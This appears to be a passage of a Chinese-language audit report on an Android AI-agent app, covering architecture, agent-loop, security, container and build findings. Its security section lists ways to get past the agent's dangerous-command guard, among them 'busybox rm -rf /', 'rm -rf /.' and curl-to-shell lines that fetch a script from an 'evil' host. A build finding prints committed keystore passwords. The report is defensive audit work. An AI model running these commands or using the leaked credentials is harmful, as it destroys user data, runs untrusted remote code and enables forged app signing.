+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-13</span><span>生成包名 me_core 与 mec 不一致</span></div>
+<p class="meta">证据：<span class="path">AGENTS.md:241</span> 写 <span class="path">com.mini.me_core.datalayer.sqldelight</span>；实际 build 配置为 <span class="path">com.mini.mecore.datalayer.sqldelight</span>（<span class="path">app/build.gradle.kts:462</span>，无下划线）。</p>
+<p><span class="lbl">建议：</span>文档统一为 com.mini.mecore。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-defect">已验证缺陷</span><span class="cid">ARC-14</span><span>build.gradle 注释引用不存在的测试</span></div>
+<p class="meta">证据：<span class="path">app/build.gradle.kts</span> testOptions 注释提到 <span class="path">MigrationSchemaConsistencyTest</span>，app/src/test 下不存在该测试。</p>
+<p><span class="lbl">影响：</span>schema 漂移无黄金测试门禁（与 ARC-05/06 互证）。<span class="lbl">建议：</span>补回该测试或删注释。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-tip">提示</span><span class="badge t-choice">设计取舍</span><span class="cid">ARC-15</span><span>provideAgentDb 与 onOpened 重复跑自愈</span></div>
+<p class="meta">证据：<span class="path">DataLayerModule.kt:160-172</span> 与 <span class="path">:131-140</span> 对 agent 库重复 ensureSchema+healer。</p>
+<p><span class="lbl">建议：</span>保留单处自愈入口。</p></div>
+
+<!-- ============ ④ AI Agent ============ -->
+<h2 class="sec" id="c-agent">④ AI Agent 核心设计</h2>
+<p class="sub">主循环为 Reducer（纯函数 reduce(state,action)）+ SideEffect（executeEvents 解释）风格，三级循环熔断（50 轮硬顶 + 3 次续写 + 6 轮空转 + LoopGuard 3/5/8），PLAN 只读在策略层真实拦截，prompt 资产外置按 mode/order 组装。主要扣分项为流式并行工具调用丢失、缺统一工具超时、以及三大 God Object。</p>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">AGT-01</span><span>流式并行工具调用 index≥2 被静默丢弃</span></div>
+<p class="meta">证据：<span class="path">feature/agent/domain/provider/OpenAIAdapter.kt:36-52</span></p>
+<pre><code>private const val OPENAI_TOOL_CALL_SUBSCRIPT_COUNT = 2
+repeat(OPENAI_TOOL_CALL_SUBSCRIPT_COUNT) { k ->
+    add(listOf("choices","0","delta","tool_calls","$k","index"))
+}</code></pre>
+<p><span class="lbl">影响：</span>SseFieldExtractor 只抽预注册路径，流式 chunk 里 tool_calls[2] 及以上永不命中；一次发起 ≥3 个并行工具调用时第 3+ 个被吞，模型误判已执行（非流式不受影响）。<span class="lbl">建议：</span>subscript 数提到 8~16，或对 tool_calls 数组变长遍历动态注册。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-02</span><span>“首 token 后不重试”保护未接线</span></div>
+<p class="meta">证据：<span class="path">feature/agent/domain/provider/RetryPolicy.kt:219-222</span>，<span class="path">OpenAIAdapter.kt:344</span> onProduced 传空 lambda。</p>
+<p><span class="lbl">影响：</span>流首字节后掉线被整条重发，DeltaAccumulator 前缀去重对增量 fragment（“Hel”/“lo ”）不生效，正文局部重复/错乱。<span class="lbl">建议：</span>attemptOnce 回传 @Volatile produced 标志，已产出则直接抛错不再重试。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-03</span><span>workflow 层无统一工具超时</span></div>
+<p class="meta">证据：<span class="path">StatefulAgentWorkflow.kt:1190-1200</span> runToolSync 无 withTimeout 包裹；<span class="path">ExecuteCommandTool.kt:60-69</span> 默认 120s、上限 3600s；<span class="path">BrowserAgentTool.kt:446</span> waitFor timeout_ms 无上限。</p>
+<p><span class="lbl">影响：</span>模型可主动传 timeout=3600 或超长 waitFor，叠加 BrowserController 全局单 mutex 串行阻塞所有浏览器操作，仅靠用户取消。<span class="lbl">建议：</span>workflow 加单工具硬顶（如 5min），浏览器 timeout coerceIn(0,60_000)。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-04</span><span>PLAN 只读约束依赖工具自律声明 capabilities</span></div>
+<p class="meta">证据：<span class="path">ToolPermissionPolicyEngine.kt:137-163</span> isDangerousTool 按能力集 + 硬编码 {writeFile,editFile,Bash} 判定。</p>
+<p><span class="lbl">影响：</span>新增写工具若忘记声明 WRITE_WORKSPACE 且不在硬编码名单，PLAN 不拦。<span class="lbl">建议：</span>新增写工具能力做启动期/编译期校验。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-05</span><span>无入参运行时 required/type 校验</span></div>
+<p class="meta">证据：<span class="path">StatefulAgentWorkflow.kt:1721</span> 直接 executeWithContext(arguments)。</p>
+<p><span class="lbl">影响：</span>模型幻觉参数名只报 TOOL_EXECUTION_FAILED，缺结构化 MISSING_*。<span class="lbl">建议：</span>pre-execute 段加 schema 校验。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-06</span><span>executeEvents 单函数约 800 行、~40 个注入依赖</span></div>
+<p class="meta">证据：<span class="path">StatefulAgentWorkflow.kt:585-1394</span>。</p>
+<p><span class="lbl">影响：</span>修改面过大、回归风险高。<span class="lbl">建议：</span>把 vision 降级链、autoTrigger、压缩调度、trajectory/索引落库抽成独立协作者，workflow 只留 reducer+effect。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-07</span><span>BrowserController（2110 行/88 函数）职责过载</span></div>
+<p class="meta">证据：<span class="path">feature/browser/domain/BrowserController.kt</span> 同时承担 WebView 绑定、导航、多标签、元素交互、下载、书签/历史、find-on-page、代理、快照 diff。</p>
+<p><span class="lbl">建议：</span>拆出 TabManager / DownloadStore / SnapshotEngine / NavigationExecutor。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-08</span><span>AIAgentViewModel（1995 行）职责混装</span></div>
+<p class="meta">证据：<span class="path">feature/agent/presentation/AIAgentViewModel.kt</span> UI 流式态、会话 CRUD、权限 resolve、计划 approve、请求队列、V2↔entity 映射混在一类。</p>
+<p><span class="lbl">建议：</span>拆会话管理 / 权限问答交互 / 流式 UI reducer。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">AGT-09</span><span>上下文压缩失败时保守返回原列表</span></div>
+<p class="meta">证据：<span class="path">ContextCompactor.kt:107-110</span> 摘要 LLM 异常时 return messages.toList()，下轮直接吃 context_window_exceeded。</p>
+<p><span class="lbl">建议：</span>失败时可退化为更激进的截断（当前为“宁可报错不丢上下文”的取舍）。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">AGT-10</span><span>MCP close 软终止、无运行期自动重连</span></div>
+<p class="meta">证据：<span class="path">StdioTransport.kt:109</span> 用 destroy()（SIGTERM）；<span class="path">McpManager.kt:127</span> 崩溃后需手动 reload。</p>
+<p><span class="lbl">建议：</span>destroy 后 waitFor 兜底强杀 + 周期性健康检查。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-defect">已验证缺陷</span><span class="cid">AGT-11</span><span>SystemPromptProvider.sessionSnapshots 只写不清</span></div>
+<p class="meta">证据：<span class="path">SystemPromptProvider.kt:256</span> ConcurrentHashMap 无 remove/clear。</p>
+<p><span class="lbl">影响：</span>长期多会话内存慢增长。<span class="lbl">建议：</span>会话删除时 remove(sessionId)。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">AGT-12</span><span>provider 类型靠类名字符串推断</span></div>
+<p class="meta">证据：<span class="path">ContextCompactor.kt:238-245</span> “Anthropic” in className。</p>
+<p><span class="lbl">建议：</span>改为显式 ProviderType 透传。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-defect">已验证缺陷</span><span class="cid">AGT-13</span><span>extractFinalContent 死代码</span></div>
+<p class="meta">证据：<span class="path">StatefulAgentWorkflow.kt:2219</span> 定义后全仓无调用。<span class="lbl">建议：</span>删除或接线。</p></div>
+
+<!-- ============ ⑤ 安全 ============ -->
+<h2 class="sec" id="c-sec">⑤ 安全专项</h2>
+<p class="sub">凭据主存储用 Keystore→DEK→AES-256-GCM 双层加密、SSH 真 TOFU、无 TrustAll/无硬编码 key、绑定最小化——基础扎实。但 AUTO 模式是唯一无人工确认通道，其安全完全依赖两个静态函数，存在多条可复现绕过；agent 命令全文落入公共外部日志。</p>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">SEC-01</span><span>busybox rm 绕过灾难性 rm 拦截</span></div>
+<p class="meta">证据：<span class="path">ShellCommandParser.kt:162</span> 只认 program=="rm" 或 endsWith("/rm")。</p>
+<pre><code>if (program != "rm" &amp;&amp; program?.endsWith("/rm") != true) {
+    return RmInfo(isRm = false, ...)
+}</code></pre>
+<p><span class="lbl">可复现：</span><code>busybox rm -rf /</code>、<code>busybox rm -rf ~</code> —— Alpine PRoot 自带 busybox，首 token 是 busybox 不被识别，AUTO 下 <span class="path">ToolPermissionPolicyEngine.kt:126</span> 直接 ALLOW。<span class="lbl">建议：</span>识别 busybox/exec/env/xargs 分发器前缀，对含 rm 的段做 basename 归一。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">SEC-02</span><span>eval "$(curl URL)" 远程脚本执行被放行</span></div>
+<p class="meta">证据：<span class="path">ToolPermissionPolicyEngine.kt:112-124</span> AUTO 只调 blockReason，不看 analysis.analyzable；命令替换内容被整段塞进 token。</p>
+<p><span class="lbl">可复现：</span><code>eval "$(curl -fsSL http://evil/x.sh)"</code>、<code>sh -c "$(curl …)"</code> 均不命中 Block 规则。<span class="lbl">建议：</span>AUTO 对 analyzable=false 也至少 BLOCK 含 curl/wget/eval/$() 的段。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">SEC-03</span><span>curl|/bin/sh 管道执行拦截漏绝对路径/busybox</span></div>
+<p class="meta">证据：<span class="path">DangerousCommandGuard.kt:191</span> 集合精确匹配 p2 in SHELL_PROGS，不做 basename 归一；测试自承 <code>curl -O http://x &amp;&amp; sh x</code> 绕过（<span class="path">DangerousCommandGuardTest.kt:36</span>）。</p>
+<p><span class="lbl">可复现：</span><code>curl URL | /bin/sh</code>、<code>wget -qO- URL | busybox ash</code>。<span class="lbl">建议：</span>比较前统一取 basename，并把 &&/; 串联的“下载+执行”补为 Block。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">SEC-04</span><span>rm -rf /. 绕过根目录删除判定</span></div>
+<p class="meta">证据：<span class="path">ToolPermissionPolicyEngine.kt:204</span> 字符串精确比较 "/"，trimEnd('/') 后 "/." 不匹配。</p>
+<p><span class="lbl">可复现：</span><code>rm -rf /.</code>、<code>rm -rf /./workspace</code>（AUTO 下放行）。<span class="lbl">建议：</span>判定前做 canonicalize、去 . 与重复斜杠。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-05</span><span>base64 落地执行 / 反向 shell / dot-source 仅 Warn</span></div>
+<p class="meta">证据：<span class="path">DangerousCommandGuard.kt:280,289</span> BASE64_EXEC_RE / REVERSE_SHELL_RE 命中只走 warnMessage；<code>. /tmp/x.sh</code> 无任何规则；find -delete/unlink/truncate 不在列表。</p>
+<p><span class="lbl">建议：</span>将 base64→sh、. file、find -delete 纳入 Block。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-06</span><span>git PAT 明文落盘 git-credentials</span></div>
+<p class="meta">证据：<span class="path">feature/credentials/data/GitCredentialsFileSync.kt:62-67</span></p>
+<pre><code>sb.append("https://").append(enc(c.username)).append(':')
+  .append(enc(c.token)).append('@').append(c.host).append('\n')
+writeAtomically(File(minimeDir, CREDENTIALS_NAME), sb.toString())</code></pre>
+<p><span class="lbl">影响：</span>files/minime/git-credentials 保存 https://user:token@host 明文；DB 内是密文。位于 App 私有 filesDir（0700）不进云备份，但 adb/root 可直读。<span class="lbl">建议：</span>收紧文件权限并文档化，考虑短凭据/凭据期。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-07</span><span>agent 完整 shell 命令写入公共外部日志</span></div>
+<p class="meta">证据：<span class="path">core/util/FileLogger.kt:35-40</span> 默认 VERBOSE 写 <span class="path">Documents/MiniMe-core/logs/</span>（卸载后仍留、文件管理器可看）；<span class="path">LinuxContainerEngine.kt:249,258,272,277,375,412,417</span> 共 7 处把完整命令落盘。</p>
+<p><span class="lbl">影响：</span>命令常内嵌 <code>git clone https://user:token@</code>、<code>curl -H "Authorization: Bearer …"</code>、<code>PASSWORD=…</code>，随命令串进入公共目录。<span class="lbl">建议：</span>落盘前对 URL 凭据/Authorization/密码赋值掩码，默认级别降到 INFO 以上。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-choice">设计取舍</span><span class="cid">SEC-08</span><span>全局 cleartextTrafficPermitted=true</span></div>
+<p class="meta">证据：<span class="path">res/xml/network_security_config.xml</span> base-config cleartextTrafficPermitted="true"；<span class="path">AndroidManifest.xml:23</span> usesCleartextTraffic="true"。</p>
+<p><span class="lbl">影响：</span>用户配 http AI 端点时 API key 明文过网（HttpWarningInterceptor 仅弹窗不阻断）。<span class="lbl">建议：</span>仅对用户显式配置的 http 域名放行 cleartext。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-09</span><span>桥接 token / 代理 secret 用非 SecureRandom</span></div>
+<p class="meta">证据：<span class="path">RcbBridge.kt:61</span>、<span class="path">ClashProxyManager.kt:267</span> newSecret() 用 kotlin.random.Random（非 SecureRandom）；McpServerSecurity.kt:39 反而正确用了 SecureRandom。</p>
+<p><span class="lbl">建议：</span>全部换 SecureRandom。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">SEC-10</span><span>WebView 全开 + 页内跳转不校验 scheme</span></div>
+<p class="meta">证据：<span class="path">BrowserController.kt:1763-1768,1774</span> javaScriptEnabled/allowFileAccess/MIXED_CONTENT_COMPAT 全开；shouldOverrideUrlLoading 直接 loadUrl 不再过 validateUrl。好的一面：无 addJavascriptInterface，导航入口白名单仅 http/https。</p>
+<p><span class="lbl">建议：</span>页内跳转也过 validateUrl，关闭 allowFileAccess 与 MIXED_CONTENT。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">SEC-11</span><span>SSH 首次连接静默接受主机密钥</span></div>
+<p class="meta">证据：<span class="path">HostKeyManager.kt:90-101</span> 首连落盘无指纹确认；变更即抛 HostKeyChangedException（<span class="path">:117</span>）正确。</p>
+<p><span class="lbl">建议：</span>首连向用户展示指纹并要求确认。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">SEC-12</span><span>检查点回滚无符号链接/路径归一校验</span></div>
+<p class="meta">证据：<span class="path">checkpoint/CheckpointManager.kt:129,135</span> 按 filePath 直接 writeFile/delete。</p>
+<p><span class="lbl">建议：</span>回滚前对 filePath 做 realpath 校验，限制在工作区内。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-tip">提示</span><span class="badge t-choice">设计取舍</span><span class="cid">SEC-13</span><span>AUTO 模式默认全放行</span></div>
+<p class="meta">证据：<span class="path">ToolPermissionPolicyEngine.kt:110</span> AUTO 仅查 DangerousCommandGuard + checkCatastrophicRm。上述绕过在 AUTO 下全部成立。<span class="lbl">建议：</span>AUTO 对不可静态判定命令默认 ASK 而非 ALLOW。</p></div>
+
+<!-- ============ ⑥ 终端/容器/newui ============ -->
+<h2 class="sec" id="c-term">⑥ 终端 / 容器 / 原生 / newui</h2>
+<p class="sub">容器进程终止工程细致（看门狗/cancellationHook/finally 三重回收、凭据在途宽限），bundle 安装有真断点续传与 apk exit=2 自愈；newui token 体系是本仓库工程化最好模块（9 分）。但 reset 在活容器上删 rootfs、只杀直接子进程、预编译 .so 无可复现来源、newui 未真正接管 app 主题。</p>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">TML-01</span><span>resetContainer 不杀活进程即删 rootfs</span></div>
+<p class="meta">证据：<span class="path">feature/agent/domain/container/LinuxContainerEngine.kt:905-931</span></p>
+<pre><code>suspend fun resetContainer() {
+  initMutex.withLock { initJob?.cancel(); initJob = null }
+  ...
+  runCatching { containerInstaller.rootfsDirFor(profile).deleteRecursively() }
+}</code></pre>
+<p><span class="lbl">影响：</span>PTY proot / MCP stdio / 后台 dev server 仍在运行即删根目录树，运行进程持有旧 inode，形成僵尸容器进程且 rootfs 一致性破坏；引擎无“活进程注册表”统一清理。<span class="lbl">建议：</span>删目录前先集中进程注册表按 rootfs 终止并 join。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-risk">设计风险</span><span class="cid">TML-02</span><span>全程只杀直接子进程、无进程组终止</span></div>
+<p class="meta">证据：<span class="path">terminal-emulator/.../SubprocessBackend.java:65-71</span> <code>Os.kill(mPid, SIGKILL)</code>；<span class="path">LinuxContainerEngine.kt:259,306,408,1016</span> process.destroy()；<span class="path">StdioTransport.kt:109</span>。全仓无 Os.kill(-pid)/setpgid。</p>
+<p><span class="lbl">影响：</span>proot 派生的后台进程（npm run dev &amp;、MCP 子进程、ssh -D）被 init 收养后继续持有端口/内存/句柄，多标签后台常驻下累积泄漏。<span class="lbl">建议：</span>利用已 setsid 的会话首 pid 改发 Os.kill(-mPid, SIGKILL)。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">TML-03</span><span>MCP stdio close 只 destroy 不 destroyForcibly</span></div>
+<p class="meta">证据：<span class="path">StdioTransport.kt:103-110</span>。<span class="lbl">建议：</span>destroy() 后 waitFor(timeout)，未退出再 destroyForcibly()。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-choice">设计取舍</span><span class="cid">TML-04</span><span>终端会话仅内存态、无跨进程恢复</span></div>
+<p class="meta">证据：<span class="path">TerminalSessionManager.kt:33-36</span>；<span class="path">TerminalKeepaliveService.kt:31-35</span> 自述重建时 session 状态已丢。START_STICKY 仅降低被杀概率。<span class="lbl">建议：</span>明确为取舍或加会话元数据持久化。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">TML-05</span><span>靠屏幕缓冲正则轮询判定命令退出</span></div>
+<p class="meta">证据：<span class="path">TerminalSessionManager.kt:467-490</span> EXIT_MARKER_REGEX 补偿 proot 不释放 PTY。<span class="lbl">建议：</span>接受，注意命令模板需打印退出 marker。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">TML-06</span><span>startProotProcess 为死代码</span></div>
+<p class="meta">证据：<span class="path">LinuxContainerEngine.kt:1216</span> 定义后无调用方。<span class="lbl">建议：</span>删除或补调用方。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">TML-07</span><span>版本不匹配删 rootfs 无停容器前置</span></div>
+<p class="meta">证据：<span class="path">ContainerInstaller.kt:325</span> deleteRecursively()。与 TML-01 同源。<span class="lbl">建议：</span>删目录前停容器。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-choice">设计取舍</span><span class="cid">TML-08</span><span>bundle 卸载不看退出码、不清共享依赖</span></div>
+<p class="meta">证据：<span class="path">LinuxContainerEngine.kt:642-644,675-680</span> 无论成败都 markUninstalled。<span class="lbl">建议：</span>接受，或卸载后重扫 apk world 校正状态。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">TML-09</span><span>Alpine apk 源走 http、无独立校验和</span></div>
+<p class="meta">证据：<span class="path">ContainerInstaller.kt:156-161</span> ALPINE_MIRROR=http://mirrors.aliyun.com/alpine；完整性由 apk /etc/apk/keys 签名兜底。<span class="lbl">建议：</span>可接受，文档已说明。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">TML-10</span><span>预编译 stripped .so 无源码/构建脚本/上游 commit</span></div>
+<p class="meta">证据：<span class="path">terminal-emulator/.../JNI.java:8</span> 注释称 C 代码在 jni/termux.c，但仓库无 jni/、无 externalNativeBuild；四 ABI libtermux.so 均 stripped（约 10KB）。</p>
+<p><span class="lbl">影响：</span>ABI 覆盖完整、功能可用，但无法审计 native 行为、无法随上游安全补丁重建。<span class="lbl">建议：</span>放 jni/README 记录上游 commit+构建命令，或纳入 termux.c 接 externalNativeBuild。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">TML-11</span><span>newui token 命名/KDoc 不一致、对账依赖 git</span></div>
+<p class="meta">证据：<span class="path">newui/build.gradle.kts:100</span>、<span class="path">AppTokens.kt:3</span> 称 *.tokens.json 实际为 color.json/dimensions.json。<span class="lbl">建议：</span>统一命名。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">TML-12</span><span>newui 未真正接管 app 主题</span></div>
+<p class="meta">证据：<span class="path">MainActivity.kt:197-207</span> 根主题仍是旧 core.theme.AIEditorTheme，手工塞 LocalAppPalette；app 内 400 处 Color(0x，终端功能区 98 处（BundleInstallCard.kt 单文件 55 处）。</p>
+<p><span class="lbl">影响：</span>newui 架构解耦干净但产品层面仍是多套设计系统并存。<span class="lbl">建议：</span>逐步把宿主切到 AppTheme()，按模块收敛硬编码色值到 appPalette()。</p></div>
+
+<!-- ============ ⑦ 构建/并发/合规 ============ -->
+<h2 class="sec" id="c-build">⑦ 构建 / 工程化 / 并发 / 合规隐私</h2>
+
+<div class="card"><div class="ct"><span class="badge b-critical">严重</span><span class="badge t-defect">已验证缺陷</span><span class="cid">BLD-01</span><span>Release 签名密钥与明文密码入库</span></div>
+<p class="meta">证据：<span class="path">app/minime.jks</span>（3560B, git tracked）；<span class="path">app/keystore.properties</span>；<span class="path">.gitignore:34-36</span> 注释自承“已入库”；<span class="path">app/build.gradle.kts:155-165</span> require 强制。</p>
+<pre><code>storeFile=minime.jks
+storePassword=9d4d4f44c1eaf5bcd57c68c5c4dab893
+keyAlias=minime
+keyPassword=9d4d4f44c1eaf5bcd57c68c5c4dab893</code></pre>
+<p><span class="lbl">影响：</span>任何 clone 仓库者可用官方密钥签发恶意 APK 冒充官方签名。<span class="lbl">建议：</span>密钥移至 CI Secrets，用 git filter-repo 从历史清除 minime.jks/keystore.properties，重新生成密钥对。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-02</span><span>无 version catalog（libs.versions.toml 缺失）</span></div>
+<p class="meta">证据：gradle/ 下无 .toml；版本全部内联（如 <span class="path">app/build.gradle.kts:262-285</span>）；compose BOM 在 app 与 newui 重复声明。</p>
+<p><span class="lbl">影响：</span>版本升级逐文件改、多模块易不一致。<span class="lbl">建议：</span>创建 gradle/libs.versions.toml 迁移所有坐标。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-high">高</span><span class="badge t-defect">已验证缺陷</span><span class="cid">BLD-03</span><span>Termux 派生代码无源码级版权/许可声明</span></div>
+<p class="meta">证据：<span class="path">terminal-emulator/.../*.java</span>（包名 com.termux.*，直接复制）源文件无版权头；README:213 仅称“技术参考”。</p>
+<p><span class="lbl">影响：</span>GPL-3.0 要求派生作品保留原始版权声明，归属不完整。<span class="lbl">建议：</span>每个 Termux 源文件头加原始版权与 GPL 引用，并建 THIRD-PARTY-NOTICES。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-04</span><span>jitpack.io 供应链入口</span></div>
+<p class="meta">证据：<span class="path">settings.gradle.kts:8,40</span> 保留 maven { url jitpack.io }。当前实际未经 jitpack 拉外部包（终端两模块为本地 project）。<span class="lbl">建议：</span>若无外部依赖则移除 jitpack 声明。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">BLD-05</span><span>仓库无 git tag，versionName 始终为 dev</span></div>
+<p class="meta">证据：git tag 为空；<span class="path">app/build.gradle.kts:46-67</span> 无四段 tag 时回退 0.0.1-dev。<span class="lbl">建议：</span>打首个正式 tag 验证 CI 发版链路。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-defect">已验证缺陷</span><span class="cid">BLD-06</span><span>无 third-party NOTICE / 第三方许可清单</span></div>
+<p class="meta">证据：全仓无 NOTICE/third-party 文件；依赖含 sshj(BouncyCastle=MIT)、ftpserver/jsoup(Ktor/SQLDelight=Apache-2.0) 等。<span class="lbl">建议：</span>用 oss-licenses-plugin 生成 THIRD-PARTY-NOTICES。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-07</span><span>二进制资产（rootfs/proot/qemu）无来源说明</span></div>
+<p class="meta">证据：<span class="path">app/src/_armAssets/container/</span> 下 alpine-rootfs.bin、proot、qemu-user-linux-arm64-x86_64、libtalloc.so.2 无 README/LICENSE。<span class="lbl">建议：</span>说明每个二进制的来源项目、版本、许可与获取方式。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-08</span><span>无隐私政策文档</span></div>
+<p class="meta">证据：无 privacy 文件；AboutSection 无隐私链接。硬编码 endpoint 含 OpenAI/Anthropic/Gemini/models.dev/API_GitHub_Releases/mihomo 下载/stepfun。好：无 Firebase/Crashlytics，遥测仅本地 SQLite。<span class="lbl">建议：</span>建隐私政策说明数据流向。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-09</span><span>runBlocking 同步桥接（3 处）</span></div>
+<p class="meta">证据：<span class="path">SkillStateRepository.kt:57</span>、<span class="path">RemoteSshConnection.kt:186</span>、<span class="path">RemoteSftpFileAccess.kt:79</span>。均在 Dispatchers.IO，但若主线程调用 getSftpClientBlocking 会阻塞 UI。<span class="lbl">建议：</span>标注线程要求，逐步迁移 suspend。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-10</span><span>githooks 未默认启用</span></div>
+<p class="meta">证据：git config core.hooksPath 为空；.githooks/ 存在但需手动配置。<span class="lbl">建议：</span>README/AGENTS 提示启用命令。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-risk">设计风险</span><span class="cid">BLD-11</span><span>AIAgentViewModel.onCleared 未取消 sessionJobs</span></div>
+<p class="meta">证据：<span class="path">AIAgentViewModel.kt:122,144-148</span>。<span class="lbl">建议：</span>onCleared 中 sessionJobs.values.forEach{it.cancel()}。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-mid">中</span><span class="badge t-choice">设计取舍</span><span class="cid">BLD-12</span><span>targetSdk 锁定 28</span></div>
+<p class="meta">证据：<span class="path">app/build.gradle.kts:148-151</span>。Android 10+ W^X/SELinux 禁止执行 App 可写目录二进制，PRoot 必要取舍；代价是不能上 Google Play。<span class="lbl">建议：</span>已知取舍，README 记录。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">BLD-13</span><span>包名 com.mini.me_core 使用下划线</span></div>
+<p class="meta">证据：<span class="path">app/build.gradle.kts:131,145</span>。合法但不符 Java/Android 惯例，一致性良好；改包名有数据丢失风险（已有三重防线）。<span class="lbl">建议：</span>低优先级。</p></div>
+
+<div class="card"><div class="ct"><span class="badge b-low">低</span><span class="badge t-choice">设计取舍</span><span class="cid">BLD-14</span><span>终端会话故意常驻后台</span></div>
+<p class="meta">证据：<span class="path">TerminalViewModel.kt:448</span>。产品取舍，长期 proot 进程占内存。<span class="lbl">建议：</span>设置页提供“关闭全部终端会话”入口。</p></div>
+
+<!-- ============ ⑧ 亮点 ============ -->
+<h2 class="sec" id="highlights">⑧ 亮点与设计取舍</h2>
+<div class="card">
+<ul class="tight">
+<li><b>迁移时序洞察与快照安全网</b>：<span class="path">AndroidVersionProbe.kt:24-30</span> 用只读原生连接在 driver 构造前探测 user_version，解决“driver 一打开版本号就被改写”的隐蔽坑；<span class="path">MigrationEngine.kt:155-172</span> 快照方向不可反、.wal/.shm sidecar 一起拷、DOWNGRADE 直接 error。</li>
+<li><b>Agent 三级循环熔断</b>：50 轮硬顶 + 3 次续写 + 6 轮空转软收敛 + LoopGuard 3/5/8，Reducer 纯函数 + SideEffect 分离，取消语义干净。</li>
